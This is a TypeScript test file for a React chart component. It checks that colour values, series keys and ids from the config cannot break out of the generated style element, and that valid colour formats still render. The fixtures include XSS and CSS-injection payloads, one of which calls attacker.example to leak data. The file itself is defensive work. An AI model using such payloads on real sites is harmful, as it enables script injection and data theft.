import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it, vi } from 'vitest';

import { ChartContainer, type ChartConfig } from './chart';

/**
 * `ChartContainer` renders `ChartStyle`, which is not exported. Rendering the
 * container to static markup is also the most faithful assertion available:
 * it is byte-for-byte what an SSR'd page would send to the browser.
 */
function markup(config: ChartConfig, id = 'test'): string {
  return renderToStaticMarkup(
    <ChartContainer id={id} config={config}>
      <svg />
    </ChartContainer>,
  );
}

describe('ChartStyle', () => {
  describe('injection through model-supplied config', () => {
    it('does not let a color break out of the <style> element', () => {
      const html = markup({
        a: { color: 'red}</style><img src=x onerror=alert(1)>' },
      });

      expect(html).not.toContain('<img');
      expect(html).not.toContain('onerror');
      // The element must not be closed early: exactly one closing tag.
      expect(html.match(/<\/style>/g)?.length ?? 0).toBeLessThanOrEqual(1);
    });

    it('drops a color carrying extra CSS declarations', () => {
      const html = markup({
        a: { color: 'red;background:url(https://attacker.example/?leak=1)' },
      });

      // Note: the container's own Tailwind classes contain the substring
      // "background", so assert on the payload and on the absence of the
      // <style> element rather than on that word.
      expect(html).not.toContain('attacker.example');
      expect(html).not.toContain('<style');
    });

    it('drops a series key that is not a CSS ident', () => {
      const html = markup({
        'a}</style><script>x': { color: 'red' },
      });

      expect(html).not.toContain('<script');
      expect(html).not.toContain('</style><');
    });

    it('renders no <style> at all when every entry is unsafe', () => {
      const html = markup({ a: { color: 'red;evil:1' } });
      expect(html).not.toContain('<style');
    });

    it('sanitizes a caller-supplied id before it reaches the selector', () => {
      const html = markup(
        { a: { color: 'red' } },
        'x"] {} body {display:none} [z="',
      );

      expect(html).not.toContain('display:none');
      expect(html).toContain('[data-chart="chart-xbodydisplaynonez"]');
    });

    // Validation runs per series, not per theme, so one bad value warns once.
    // The warning is unconditional — this package ships raw tsc output and
    // cannot rely on `process.env.NODE_ENV` being defined or inlined.
    it('warns exactly once per dropped series', () => {
      const warn = vi
        .spyOn(console, 'warn')
        .mockImplementation(() => undefined);
      markup({ a: { color: 'red;evil:1' } });
      expect(warn).toHaveBeenCalledOnce();
      warn.mockRestore();
    });

    // A series must never render in one theme and vanish in the other.
    it('drops a themed series whole when only one theme is unsafe', () => {
      const warn = vi
        .spyOn(console, 'warn')
        .mockImplementation(() => undefined);
      const html = markup({
        a: { theme: { light: '#fff', dark: 'red;evil:1' } },
      });

      expect(html).not.toContain('<style');
      expect(html).not.toContain('--color-a');
      warn.mockRestore();
    });
  });

  describe('fidelity of legitimate colors', () => {
    it.each([
      ['hex', '#ff0000'],
      ['hex with alpha', '#ff0000cc'],
      ['css variable', 'var(--chart-1)'],
      ['oklch with alpha', 'oklch(0.7 0.1 200 / 50%)'],
      ['rgb', 'rgb(255, 0, 0)'],
      ['hsl', 'hsl(220, 70%, 50%)'],
      ['color-mix', 'color-mix(in oklch, red 50%, blue)'],
      ['keyword', 'transparent'],
    ])('preserves a %s color', (_label, color) => {
      const html = markup({ desktop: { color } });
      expect(html).toContain(`--color-desktop: ${color};`);
    });

    it('emits one rule per theme', () => {
      const html = markup({
        desktop: { theme: { light: '#fff', dark: '#000' } },
      });

      expect(html).toContain('[data-chart="chart-test"] {');
      expect(html).toContain('.dark [data-chart="chart-test"] {');
      expect(html).toContain('--color-desktop: #fff;');
      expect(html).toContain('--color-desktop: #000;');
    });

    it('renders no <style> when no series declares a color', () => {
      const html = markup({ desktop: { label: 'Desktop' } });
      expect(html).not.toContain('<style');
    });
  });
});
